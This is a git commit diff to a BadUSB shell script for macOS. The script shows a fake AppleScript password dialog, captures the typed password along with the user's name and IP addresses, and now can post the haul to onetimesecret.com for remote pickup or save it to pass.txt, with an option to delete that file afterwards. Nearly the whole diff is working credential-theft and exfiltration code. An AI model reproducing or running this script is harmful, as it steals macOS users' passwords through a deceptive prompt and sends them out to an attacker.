e34d61bc2c378007ec7b28a3a3170d0e81097ef3
Nate Whistler <nate.whistler@gmail.com>
2022-06-13 13:41:16 -0700

    Added switch commands for how many times to run, and onetimesecret url creation.

--- badusb/MacOS/prompt.sh
+++ badusb/MacOS/prompt.sh
@@ -3,7 +3,14 @@
 externalip=$(curl -s http://ipecho.net/plain)
 internalip=$(ifconfig en0 | grep inet | awk '$1=="inet" {print $2}')
 username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
-fullname=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/RealName :/ && ! /loginwindow/ { print $3 }')
+
+#Runtime Default Values
+promptcount=0
+cflag=
+oflag=
+nflag=
+
+
 
 
 read -r -d '' applescriptCode <<'EOF'
@@ -16,7 +23,35 @@ set dialogText to text returned of (display dialog "" & msg1 & username & msg2 w
 return dialogText
 EOF
 
+while getopts con: options
+do
+    case $options in
+    c)    cflag=1;;
+    o)    oflag=1;;
+    n)    nflag=1
+          nval="$OPTARG";;
+    ?)   printf "Usage: %s: [-n value] args\n" $0
+            exit 2;;
+    esac
+done
+
+if [ ! -z "$nflag" ]; then
+    promptcount=$(($nval - 1))
+fi
+
+for i in $( eval echo {0..$promptcount} )
+do
 dialogText=$(osascript -e "$applescriptCode");
-echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;
+capture=$(echo ExternalIP="$externalip" + InternalIP="$internalip" + username="$username"  + password="$dialogText");
+done
 
+if [ ! -z "$oflag" ]; then
+metadata=$(curl -d 'secret='"$capture"'&ttl=3600' https://onetimesecret.com/api/v1/share | jq -r '.metadata_key')
+printf "https://onetimesecret.com/private/$metadata\n"
+else
+    echo "$capture" >> pass.txt
+fi
 
+if [ ! -z "$cflag" ]; then
+    rm pass.txt
+fi
